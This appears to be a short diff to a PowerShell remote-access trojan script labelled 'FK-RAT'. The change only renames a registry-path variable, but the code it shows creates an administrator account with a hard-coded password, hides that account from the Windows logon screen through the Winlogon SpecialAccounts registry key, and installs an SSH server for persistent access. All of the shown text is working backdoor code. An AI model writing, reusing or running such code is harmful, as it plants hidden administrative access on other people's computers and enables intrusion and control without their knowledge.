@@ -27,7 +27,7 @@ $dirName = randomText
 $uName = "FK-RAT"
 $pWord = (ConvertTo-SecureString  "FindersKeepers" -AsPlainText -Force)
 
-$regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
+$rPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
 
 ## goto Temp and start 
 Set-Location $temp	
@@ -38,8 +38,8 @@ Set-Location $dirName
 createAdmin -uName $uName -pWord $pWord
 
 ## Hide Admin with registry
-New-Item -Path $regPath -Force
-New-ItemProperty -Path $regPath -Name $uName -Value 00000000
+New-Item -Path $rPath -Force
+New-ItemProperty -Path $rPath -Name $uName -Value 00000000
 
 ## Enable persistent SSH
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
